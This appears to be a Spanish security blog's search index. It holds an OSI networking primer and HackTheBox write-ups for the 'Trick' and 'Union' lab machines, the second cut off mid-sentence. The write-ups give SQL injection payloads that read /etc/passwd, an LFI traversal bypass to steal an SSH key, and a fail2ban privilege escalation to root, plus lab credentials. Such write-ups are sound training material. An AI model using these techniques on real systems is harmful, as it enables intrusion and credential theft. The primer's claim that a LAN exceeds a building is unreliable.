[
  
  {
    "title": "Introducción a redes Modelo OSI - Fundamentos",
    "url": "/posts/Introduccion_Redes/",
    "categories": "Hacking y más, Por donde empezar?",
    "tags": "Redes, Introduccion",
    "date": "2023-02-13 00:00:00 -0600",
    





    "snippet": "Qué es una red?es un conjunto de equipos conectados por medio de cables, señales, ondas o cualquier otro método de transporte de datos, comparten cierta información conectadas entre si para la transmisión de datosTipos de redes en base a la distanciaLAN: Local Area Network (Red de Área Local) Es una red de comunicación cuya área de cobertura geográfica excede el ámbito de un edificio. En una red de este tipo los ETD (equipo terminal de datos) son generalmente pero no necesariamente computadoras ya sean personales del tipo rango medio o grandes computadoras trabajando en modo estación de trabajo o servidor.**WAN: Wide Area Network (red de área amplia)  **Las redes WAN interconectan LAN o servidores de ficheros en otros lugares, como las WAN conectan redes sobre un área geográfica grande hace posible que las empresas puedan comunicarse a grandes distancias. ·         La WAN esta diseñada para: ·         Proporcionar recursos a tiempo completo ·         Ofrecer servicios de correo electrónico, WWW (world Wide Web), transferencia de ficheros y comercio electrónico.PAN: Personal Area Network (red de área personal) Permite comunicar e intercambiar información entre ordenadores, PDA, impresoras, teléfonos móviles, y otros dispositivos en un área limitada normalmente unos pocos metros   Las tecnologías utilizadas en PAN son conexiones por: infrarrojos, bluetooth, radio frecuencias, etc.MAN: Metropolitan Area Network (red de área metropolitana)     Es una red de alta velocidad (banda ancha) que da cobertura en un área geográfica extensa, proporciona capacidad de integración de múltiples servicios mediante la transmisión de datos, voz y video, sobre medios de transmisión tales como fibra óptica y par trenzado (MAN BUCLE), la tecnología de pares de cobre se posiciona como la red mas grande del mundo.Modelo OSI(Modelo de interconexión de sistemas abiertos) Fue creado por la Organización Internacional para la Estandarización (ISO) en el año 1980. Es un marco de referencia para la definición de arquitecturas en la interconexión de los sistemas de comunicaciones. Este modelo se divide en 7 capas.Capa de aplicación:Es responsable de intercambiar información entre los programas que corren en una computadora.Capa de presentación:Formatea la información de manera que la aplicación del software pueda leerla.Capa de sesión:Determina como dos dispositivos se comunican, establece y monitorea las conexiones entre computadorasCapa de transporte:Corrige los errores de transmisión y asegura que la información sea entregada en forma confiable.Capa de red:Identifica a las computadoras en una red y determina como dirigir la transferencia de información por la misma.Capa de enlace:Agrupa los datos en secciones para prepararlos y transferirlos por la red.Capa física:se define como un medio de transmisión, por ejemplo, un cable, se conecta a una computadora Modelo OSIIP y sus tiposIP(Internet Protocol) este conjunto de reglas sirve para comunicar a través de internet o en una red local identifica una red o dispositivo en InternetIP públicaes aquella que se va a encargar de enviar y recibir mensajes a través de internet con ella puedes comunicarte con otros usuarios fuera de tu red local. Todos tenemos una a la hora de navegar por internet y es muy importante que esta IP no se comporta con terceras personas ya que pueden hacer uso de ella como  el que podrían hacerse pasar por ti, robar tu información, localizar la dirección de tu casa (aunque esta no es exacta, solo es un rango de kilómetros de tu lugar real de origen) , país de residencia o una denegación de servicio (DDoS o DoS) por eso es importante hacer uso de una VPN para cifrar la conexión o hacer uso de un proxyIP privadaes la que esta compartida solamente en tu area de red local, como en tu casa, empresa, negocio etc… se le conoce como red Interna, las direcciones privadas las emite un dispositivo de red, como un router, que las extrae de un conjunto de direcciones que le ha asignado un servidor DHCP.IP dinámicaUna dirección IP es una etiqueta numérica que identifica, de manera lógica y jerárquica, a un interfaz de un dispositivo dentro de una red que utilice el protocolo IP que corresponde al nivel de red del Modelo OSI. La dirección IP puede cambiar muy a menudo por cambios en la red o porque el dispositivo encargado dentro de la red de asignar las direcciones IP decida asignar otra IP (por ejemplo, con el protocolo DHCP). A esta forma de asignación de dirección IP se denomina también dirección IP dinámica (normalmente abreviado como IP dinámica).IP estáticaLos sitios de Internet que por su naturaleza necesitan estar permanentemente conectados generalmente tienen una dirección IP fija (comúnmente, IP fija o IP estática). Esta no cambia con el tiempo. Los servidores de correo, DNS, FTP públicos y servidores de páginas web necesariamente deben contar con una dirección IP fija o estática, ya que de esta forma se permite su localización en la red.Direcciones privadaspueden ser utilizadas por los hosts que usan traducción de dirección de red (NAT) para conectarse a una red pública o por los hosts que no se conectan a Internet. En una misma red no pueden existir dos direcciones iguales, pero sí se pueden repetir en dos redes privadas que no tengan conexión entre sí o que se conecten mediante el protocolo NAT.IPv4Las direcciones IPv.4 se expresan por un número binario de 32 bits, permitiendo un espacio de direcciones de hasta 4.294.967.296 (232) direcciones posibles. Las direcciones IP se pueden expresar como números de notación decimal: se dividen los 32 bits de la dirección en cuatro octetos. El valor decimal de cada octeto está comprendido en el rango de 0 a 255 [el número binario de 8 bits más alto es 11111111 y esos bits, de derecha a izquierda, tienen valores decimales de 1, 2, 4, 8, 16, 32, 64 y 128, lo que suma 255].En la expresión de direcciones IPv4 en decimal se separa cada octeto por un carácter único “.”. Cada uno de estos octetos puede estar comprendido entre 0 y 255, salvo algunas excepciones. Los ceros iniciales, si los hubiera, se pueden obviar.IPv6La función de la dirección IPv6 es exactamente la misma que la de su predecesor IPv4, pero dentro del protocolo IPv6. Está compuesta por 128 bits y se expresa en una notación hexadecimal de 32 dígitos. IPv6 permite actualmente que cada persona en la Tierra tenga asignados varios millones de IPs, ya que puede implementarse con 2128 (3.4×1038 hosts direccionables). La ventaja con respecto a la dirección IPv4 es obvia en cuanto a su capacidad de direccionamiento.Su representación suele ser hexadecimal y para la separación de cada par de octetos se emplea el símbolo “:”. Un bloque abarca desde 0000 hasta FFFF.DHCPAsignación automática No se requiere asignar manualmente direcciones IP. El servidor DHCP asigna al cliente DHCP, en el primer contacto, una dirección IP permanente que no podrá reutilizar ningún otro cliente DHCP.Qué es una NAT y sus tipos?NATEn redes, NAT significa Network Adress Translation o Traducción de direcciones de red en español. Se trata de un sistema que se utiliza en las redes bajo el protocolo IP y que nos permite el intercambio de paquetes entre dos redes que tienen asignadas mutuamente direcciones IP incompatibles.En resumen, el NAT ayuda a controlar que las direcciones IPv4 se agoten, administrando direcciones IPv4 locales o privadas de todos los equipos conectados a la red. Entonces, si hay tres ordenadores, dos móviles, una impresora y cualquier otro equipo, cada uno tiene una dirección IP privada, lo que haría un total de siete direcciones. NAT los trata individualmente dentro de la red, pero para Internet, es solo una dirección IP, como si fuera un dispositivo único.NAT Estáticaes cuando una dirección ip privada siempre se traduce en la misma dirección ip públicaNAT dinámicael router tiene un grupo de direcciones ip, a cada una de las direcciones ip privadas se le otorga una ip publica del grupo de las ip del routerConexión en máquinas VirtualesAdaptador puenteEl adaptador puente hace que la máquina virtual se conecte a la misma red que el anfitrión, de tal forma que la MV se comportará como si fuera un PC más conectado a la red real. Nos permite conectar entre MV, desde el anfitrión, y a Internet bidireccionalmente. Por contra, nos puede ocasionar problemas puesto que estará conectado a la red real (especialmente en caso de montar servidores).AnfitriónEn modo solo anfitrión podremos conectarnos desde el anfitrión a nuestras máquinas virtuales y viceversa, así como conectar entre máquinas virtuales. En todo caso, no tendremos por defecto conexión a internet (ni de salida ni de entrada)ISPProveedor de servicios de Internet. Una empresa que le proporciona acceso a Internet, normalmente a través de una conexión de acceso telefónico, de DSL o de banda ancha.ICMPprotocolo de control de mensajes de internet, ICMP maneja los mensajes de error y control para IP. Este protocolo permite a las pasarelas y los sistemas principales enviar informes de problemas a la máquina que envía un paquete.Envío de mensajes  Existen 2 grupos:          Control de Transmisión      Internet      Segmentación -&gt; Tomar un mensaje y dividirlo en pequeñas partesMultiplexación -&gt; es la combinación de dos o mas canales de información en un solo medio de transmisiónPDU Protocol Data Unit es una unidad que nos permite identificar la información a medida que es transmitida a través de las capas de red.Seguridad empleada en modelo osiNormalmente  todos los puntos a tratar de acuerdo al modelo osi son importante pero sobre hay que tener muy bien cubierta las primeras tres capas del modelo osi para tener buena gestión1 - Física - evitar conexiones físicas como cables no autorizados, memorias USB , routers, switches etc… Tipo de ataque mas común - &gt; SNIFFING2 - Enlace de Datos - Normalmente se componen de falsificaciones de datos como puede ser la técnica para enmascarar la dirección MAC de un dispositivo de red que está codificada en una tarjeta de red (MAC spoofing)3 - Red - es donde se da la captura y escaneo de paquetes en una red el ataque mas presentado en esta capa es el típico (MAN In The Middle) Hombre en el medio como su nombre lo dice puede actuar un intermediario para la leer, insertar y modificar a voluntad paquetes que pasen en una red"
  },
  
  {
    "title": "Trick Writeup",
    "url": "/posts/Trick/",
    "categories": "HackTheBox, Machines Easy",
    "tags": "Writeup, Guías, HackTheBox, Domain Zone Transfer Attack, DNS",
    "date": "2023-02-07 00:00:00 -0600",
    





    "snippet": "10.10.11.166 Trick (easy machine) vengo a traer otra guía para la maquina trick de HackTheBox tocando y explicando acerca del ataque de transferencia de zona, una de las vulnerabilides presentes en los servicios DNS donde podrmemos aprovecharnos de ello para hacer transacciones entre los dominion que se lleguen a emplear, con una técnica de bypassing en un LFI Directory Path TraversalInformation Ghatering / ScanPorts  Comenzaremos haciendo una fase de descubirmiento con nmap para apreciar servicios y versiones que emplea la máquina objetivo.$ nmap -p-  -sS -vvv  --min-rate 2000 -n -Pn 10.10.11.166 -oG allPorts -p-  -&gt; escanearemos todos los rangos de puertos (65535)-sS -&gt; análisis utilizando TCP SYN Este tipo de escaneo, está basado en la velocidad de escaneo, de ahí la versatilidad que mencionamos anteriormente, ya que permite escanear miles de puertos por segundo en una red que se encuentre de&gt;-vvv -&gt; verbose para que mediante vayas descubriendo puertos se reporten en la terminal–min-rate 2000 -&gt; paquetes enviados no mas lentos que 2000 paquetes por segundo, envío de paquetes super rápido-n -&gt; que no aplique resoluci+on de DNS para que no tarde el escaneo-Pn -&gt; ni que me detecte el descburimiento de hosts$ nmap -p-  -sS -vvv  --min-rate 2000 -n -Pn 10.10.11.166 -oG allPorts Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-07 18:48 CSTInitiating SYN Stealth Scan at 18:48Scanning 10.10.11.166 [65535 ports]Discovered open port 22/tcp on 10.10.11.166Discovered open port 53/tcp on 10.10.11.166Discovered open port 25/tcp on 10.10.11.166Discovered open port 80/tcp on 10.10.11.166Completed SYN Stealth Scan at 18:48, 20.73s elapsed (65535 total ports)Nmap scan report for 10.10.11.166Host is up, received user-set (0.067s latency).Scanned at 2023-02-07 18:48:37 CST for 21sNot shown: 65531 closed tcp ports (reset)PORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6325/tcp open  smtp    syn-ack ttl 6353/tcp open  domain  syn-ack ttl 6380/tcp open  http    syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 20.83 seconds           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)me copiaré esos puertos abiertos para analizar servicios y versiones que corren en ellos-sCV -&gt; escaneo lanzando scripts que detecten servicios y versiones-p -&gt; especeficando los puertos a escanear-oN y todo nuestro output lo guardamos en una captura formato nmap con el nombre de targeted$ nmap -sCV -p22,25,53,80 10.10.11.166 -oN targetedStarting Nmap 7.93 ( https://nmap.org ) at 2023-02-07 18:57 CSTNmap scan report for trick.htb (10.10.11.166)Host is up (0.066s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: |   2048 61ff293b36bd9dacfbde1f56884cae2d (RSA)|   256 9ecdf2406196ea21a6ce2602af759a78 (ECDSA)|_  256 7293f91158de34ad12b54b4a7364b970 (ED25519)25/tcp open  smtp    Postfix smtpd|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)| dns-nsid: |_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian80/tcp open  http    nginx 1.14.2|_http-title: Coming Soon - Start Bootstrap Theme|_http-server-header: nginx/1.14.2Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 49.16 secondsal primer vistazo y buscar mas sobre el puerto 80 que es http, en el sitio web no encontramos nada interesanteweb  Sin embargo al indagar sobre el sitio web no hay realmente nada interesante, asi que la intrusión dudo que se pueda hacer por ahí, uno de los puertos que me llamó la atención fue el 53, ya que este es utilizado para servicios DNS, este protocolo permite utilizar tanto TCP como UDP para la comunicación con los servidores DNS por lo tanto para hacer un ataque de transferencia de zona tengo que tener el nombre del dominio, asi que ocuparé nslookup nslookup es una herramienta de línea de comandos muy práctica y fácil de usar, cuya función básica es encontrar la dirección IP de un equipo determinado o realizar una búsqueda DNS inversa (es decir, encontrar el nombre de dominio de una determinada dirección IP). apauntaré entonces indicandole la ip del servidor para que posteriormente me resuelva al nombre del dominioencontramos que es trick.htb, lo que haré es guardarlo en el /etc/hosts con su respectiva ip para que cuando apunte al nombre del dominio me resuelva al sitio,aplicando esta resolución de DNSPost Explotaciónuna vez con esto podré iniciar con el ataque de transferencia de zona, el ataque de transferencia de zona es un tipo de transacción DNS (sistema de nombres de dominio, el cual traduce y/o apunta cada dominio a la IP correspondiente) normalmente inducida a través de una consulta tipo “AXFR” para poder replicar bases de datos con registros entre servidores DNS. podremos visualizar con exactitud algun otro subdominio que pueda llegar a empleary encontramos un subdominio bastante interesante llamado preprod-payroll.trick.htb posteriormente lo incorporamos de nuevo al /etc/hosts para que me resuelva y apunte al nuevo dominio que acabamos de encontrarsi apuntamos al dominio nuevo que encontramos, vemos un login asi que de primeras se me ocurrio hacer una inyección sql básicay bueno fue realmente fácil acceder y estar logueados plenamente como administradores, checando mas el sitio web vemos que en la parte superior emplea rutas que estan cotempladas, primeramente se me ocurre derivar un LFI de ahi pero no tenemos exito, sin embargo al usar un wrapper apuntando a una ruta que estan contempladas decodificandolo en base64 en el output de la web si me lo representa, pero si intento apuntar a un archivo local de la máquina como el /etc/passwd no me arroja nada incluso haciendo algunas técnicas de bypassing por si llega a emplear algún WAF que me impida leer archivos internos del servidorExplotaciónasi que esto no me sirve para nada porque solo puedo leer lo mismo que esta en cada sección de la web como es el (home) pero en base64, a este punto se me ocurre hacer un Fuzzing en el subdominio que emplea para descubrir nuevas rutas, me ayudaré de wfuzz para hacer un brute force sobre ese subdominio empleando un diccionario–hc=404,400  -&gt; ocultamos codigos de erorres–hh=5480 -&gt; ocultamos carácteres-t 200 -&gt; 200 hilos para tareas en paraleloy sustituimos sobre donde queremos hacer el ataque de fuerza bruta, en este caso quitaremos payroll y colocar FUZZ que es propia de wfuzz para sustituir en donde queremos hacer el ataque de fuerza bruta http://preprod-payroll.trick.htb, quedando asi la sintaxis para hosts -H ‘Host: preprod-FUZZ.trick.htb’ http://10.10.11.166  Nota: podemos ver que http://preprod-payroll.trick.htb, la palabra preprod viene de preproducción asi que es probable encontrar mas subdominio que esten contemplando algo similar a lo que acabamos de verencontramos la palabra marketing lo que haré es simplmente anexar el nuevo dominio  al /etc/hostsse ve que aun los desarrollader aun no han terminado este sitio web, por lo tanto podemos encontrar mejores cosas. algo muy curioso es volver a ver encontrar las mismas rutas de arriba que apuntaintentando el Local File inclusion(LFI) no vemos nada pero esa ruta puede existir ya que  nos muestra vacio el contenidoasi que haré alguna tecnica de bypassing en el Path Traversal como nos muestra en el repositorio de PayloadsAllTheThingsBypass “../” replaced by ““A veces encuentra un WAF que elimina los caracteres “../” de las cadenas, simplemente duplíquelos...././...\\.\\enviaré la misma petición con la técnica de bypassing pero con curl para mas comodidad, y vemos que tenemos éxito al LFI :D! ahora como el puerto 22(ssh) está abierto podemos ver si el usuario michael tiene una clave id_rsa privada que me permita acceder por sshy pues bueno efectivamente vemos la clave copiamos, pegamos y le damos permisos 600 para que el propietario solo la pueda escribir y leer y nos autorizo la conexiónPrivilege Escalationsi damos sudo -l para  ver que permisos de sudoers vemos  fail2ban, Fail2ban es una aplicación de Linux que permite evitar accesos no autorizados al servidor. Funciona bloqueando, o baneando, las IP que realicen varios intentos de acceso incorrectos al servidor. Y se trata de una estrategia ideal de seguridad a tener en cuenta tras contratar un Servidor Cloudmichael@trick:~$ sudo -lMatching Defaults entries for michael on trick:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser michael may run the following commands on trick:    (root) NOPASSWD: /etc/init.d/fail2ban restartmichael@trick:~$ buscando mas sobre como escalar privilegios en fail2ban vemos que nos menciona unas rutas donde podriamos aprovecharnos de ellafind /etc -writable -ls 2&gt;/dev/null“Aquí encontramos directorios donde tenemos acceso de escritura dentro de los directorios /etc y tenemos acceso de escritura a /etc/fail2ban/action.d” Miremos dentro de /etc/fail2ban/jail.conf para saber más sobre cómo se configura fail2banmichael@trick:~$ find /etc -writable -ls 2&gt;/dev/null   269281      4 drwxrwx---   2 root     security     4096 Feb  8 03:30 /etc/fail2ban/action.dmichael@trick:~$ analizando el archivo de configuración vemos que si intentamos acceder por ssh nos banea la ip por 10 segundos haciendo uso de 5 intentosmichael@trick:~$ cat /etc/fail2ban/jail.conf | grep -v \"^#\" | lessignorecommand =bantime  = 10sfindtime  = 10smaxretry = 5Para la escalada de privilegios, intentaremos 5 intentos fallidos con ssh para conectarnos al servidor para que podamos ser baneados y dentro de /etc/fail2ban/action.d hay un archivo de configuración iptables-multiport.conf donde podemos escribir reglas y Comandos actionstart,actionstop,actioncheck, actionban , actionunban.así que cuando nos baneen y los comandos dentro de actionban se ejecutarán.michael@trick:/etc/fail2ban/action.d$ ls -la iptables-multiport.conf -rw-r--r-- 1 root root 1420 Feb  8 03:45 iptables-multiport.confmichael@trick:/etc/fail2ban/action.d$ Solo la raíz tiene acceso de escritura al archivo, ahora cambiamos el nombre de iptables-multiport.conf con iptables-multiport.conf.bak y luego copiamos iptables-multiport.conf.bak a iptables-multiport.conf para que se cambie el propietario del archivo. por lo tanto haré moveré del original a una copia y después crearé una copia pasandolo al original para que me den permisos de escribir en ellomichael@trick:/etc/fail2ban/action.d$ ls -la iptables-multiport.conf -rw-r--r-- 1 root root 1420 Feb  8 03:48 iptables-multiport.confmichael@trick:/etc/fail2ban/action.d$ mv iptables-multiport.conf iptables-multiport.bakmichael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.bak iptables-multiport.confmichael@trick:/etc/fail2ban/action.d$ nano iptables-multiport.confeditamos el archivo iptables-multiport.conf cambiandole los comandos de iptablespor permisos SUID a la bash (como dicho servicio corre como root al banearme tendré permisos solo para ejecutar bash en privilege y ser root)una vez ejecutado procederé a restablecer el serviciomichael@trick:/etc/fail2ban/action.d$ sudo -lMatching Defaults entries for michael on trick:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser michael may run the following commands on trick:    (root) NOPASSWD: /etc/init.d/fail2ban restartmichael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.ahora con ayuda de hydra haré un ataque de fuerza bruta para que al proposito me banee y con watch cada segundo visualizaré los permisos de la bashdespués de unos segundos que nos bloquee por los intentos tenemos SUID a la bash solo con poner bash -p ya estaríamos como root y otra máquina mas completada:) !!"
  },
  
  {
    "title": "Union Writeup",
    "url": "/posts/Union/",
    "categories": "HackTheBox, Machines Medium",
    "tags": "Writeup, Guías, HackTheBox, SQLI, Web",
    "date": "2023-01-31 00:00:00 -0600",
    





    "snippet": "10.10.11.128 Union (medium machine)Information Ghatering / ScanPorts  Comenzamos con la fase de recolección de información haciendo un escaneo por TCP en todos los puertos con nmap$ nmap -p-  -sS -vvv  --min-rate 2000 -n -Pn 10.10.11.128 -oG allPorts -p-  -&gt; escanearemos todos los rangos de puertos (65535)-sS -&gt; análisis utilizando TCP SYN Este tipo de escaneo, está basado en la velocidad de escaneo, de ahí la versatilidad que mencionamos anteriormente, ya que permite escanear miles de puertos por segundo en una red que se encuentre desprotegida o carezca de un firewall, no termina la conexión TCP/SYN - Envias un SYN - Recibes un SYN/ACK - Envias ResetPacket-vvv -&gt; verbose para que mediante vayas descubriendo puertos se reporten en la terminal–min-rate 2000 -&gt; paquetes enviados no mas lentos que 2000 paquetes por segundo, envío de paquetes super rápido-n -&gt; que no aplique resoluci+on de DNS para que no tarde el escaneo-Pn -&gt; ni que me detecte el descburimiento de hosts$ nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.128 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 17:04 CSTInitiating SYN Stealth Scan at 17:04Scanning 10.10.11.128 [65535 ports]Discovered open port 80/tcp on 10.10.11.128Completed SYN Stealth Scan at 17:05, 26.49s elapsed (65535 total ports)Nmap scan report for 10.10.11.128Host is up, received user-set (0.093s latency).Scanned at 2023-01-31 17:04:36 CST for 27sNot shown: 65534 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON80/tcp open  http    syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 26.93 seconds           Raw packets sent: 131088 (5.768MB) | Rcvd: 20 (880B)Observamos que solo tenemos el puerto 80 expuesto y si hacemos un barrido de puertos y servicio tampoco recibimos suficiente información, eso me hace pensar que la explotación será a través de la web solamentenmap -sCV -p80 10.10.11.128 -oN targeted                               Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 17:05 CSTNmap scan report for 10.10.11.128Host is up (0.068s latency).PORT   STATE SERVICE VERSION80/tcp open  http    nginx 1.18.0 (Ubuntu)| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-title: Site doesn't have a title (text/html; charset=UTF-8).|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds-sCV -&gt; escaneo lanzando scripts que detecten servicios y versiones-p -&gt; especeficando los puertos a escanear-oN y todo nuestro output lo guardamos en una captura formato nmap con el nombre de targetedvemos un sitio web un poco extraño donde pide ingresar un usuario, dicho sitio es una especie de registro en un torneo. eso me hace pensar que ya hay algunos registros por detras contemplados asi que puede ser vulnerable la base de datos por inyección.el sitio comtempla php intentando varios tipos de command injection no tengo resultados ya que mi input lo registra y me pide una especie de flagpara completar el registro me pide una flag, para visualizar esto mejor y tener comodidad al leer el output de la web interceptaré por Burpsuite la petición, por lo tanto al tramitar mi data por POST trataré de hacer la tipica inyección SQL para ver que tipo de resultado me arrojay vemos que nos menciona un usuario llamado ippsec que ya esta registrado en el sistema, por lo tanto la explotación puede ser por SQLIPost Explotaciónen este punto haré varias tipos de inyecciones guíandome de alguna error based para enumerar columnasplayer=admin'order by 10-- -player=admin'order by 5-- -player=admin'order by 1-- -pero no tenemos éxito, me sigue reportando que se ha registrado el usuario, por lo tanto intentare directamente aplicar una unión comenzando desde la primera columna seguido de otras mas un tipo fuzzingplayer=admin'union select 1,2,3-- -player=admin'union select 1,2-- -hasta este punto me sigue reportando el usuario registrado pero pasa algo si solo enumero una columnapor lo tanto en esa sentencia de valor de 1 es donde aplicaré las querys, comenzando con un version() para enumerar la versión de la base de datos en usola query puede ser directa por lo tanto intentare enumerar primero el nombre de la base de datos en uso ,si puedo cargar archivos internos del servidor y algun usuario con el que este relacionado con la dbconsulta para saber el nombre de la base de datos en uso$ mi inputplayer=admin'union select database()-- -&gt;output Sorry, november you are not eligible due to already qualifying.consulta para apuntar a archivos internos del servidor$mi inputplayer=admin'union select load_file(\"/etc/passwd\")-- -&gt; output Sorry, root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falseusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsshd:x:112:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinhtb:x:1000:1000:htb:/home/htb:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsemysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/falseuhc:x:1001:1001:,,,:/home/uhc:/bin/bashyou are not eligible due to already qualifying.consulta para ver usuario$mi inputplayer=admin'union select user()-- -&gt;output Sorry, uhc@localhost you are not eligible due to already qualifying.Explotación  En este punto ya tenemos varias cosas interesantes          Nombre de usuario      Nombre de la base de datos      Lectura de archivos internos del servidor      por lo tanto comenzaré con las inyecciones sql sobre la db en uso que es novemberPrimera inyección para saber las tablas existentes de la db “november”Muy bien veo una que la tabla se llama flag Posteriormente haré otra inyección para saber las columnas de la tabla flagy veo una columna que se llama one Haré una ultima inyección para dumpear el contenido que se almacena en la tabla flag en la columna oneanexando un group_concat por si veo mas data seguido de pero ese no es el caso, simplmente hay el valor que parece ser la flag de un usuario y ese usuario quiero pensar que es uhc@localhost, comprobaré en el sitio web si con ese usuario y esa flag me sale alguna otra cosay enhorabuena :D en complete challengue colocando la flag me permite tener acceso por ssh ya que mi ip la registra, haciendo otro escaneo con nmap vemos el puerto 22 expuesto , que ese puerto no estaba abierto la primera vez que hicimos el escaneo$ map -p- -sS --open -sCV -n -Pn 10.10.11.128                           Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 22:30 CSTStats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 0.68% doneStats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 22.32% done; ETC: 22:31 (0:00:35 remaining)Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 25.35% done; ETC: 22:31 (0:00:29 remaining)Nmap scan report for 10.10.11.128Host is up (0.068s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)|_  256 2221e9f485908745161f733641ee3b32 (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-title: Site doesn't have a title (text/html; charset=UTF-8).|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 34.37 secondsel único problema es que no tengo credenciales para acceder por ssh ni una clave que me permita acceder directamente, enumerando con la inyección load_file(“”) hay rutas por defecto en el sistema que guardan archivos importantes de configuraciones como config.php, el servicio emplea php por lo tanto buscaré en la ruta por defecto en /var/www/html/config.phpy tenemos credenciales:) solo falta probar si son las mismas para el usuario uhc (usuario que extraímos del /etc/passwd) &lt;?php  session_start();  $servername = \"127.0.0.1\";  $username = \"uhc\";  $password = \"uhc-11qual-global-pw\";  $dbname = \"november\";  $conn = new mysqli($servername, $username, $password, $dbname);?&gt;y efectivamente son las credenciales, por lo tanto tenemos la primera flag$ sshpass -p 'uhc-11qual-global-pw' ssh uhc@10.10.11.128    Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Mon Nov  8 21:19:42 2021 from 10.10.14.8uhc@union:~$ whoamiuhcuhc@union:~$ find \\-name user.txt./user.txtuhc@union:~$ find \\-name user.txt | xargs cat0217bc461a1f2d56a27b91eabf1dd7cbuhc@union:~$ Privilege Escalational meternos al directorio /var/www/html/ vemos un firewall.php es emplea X_FORWARDED_FOR y el uso de 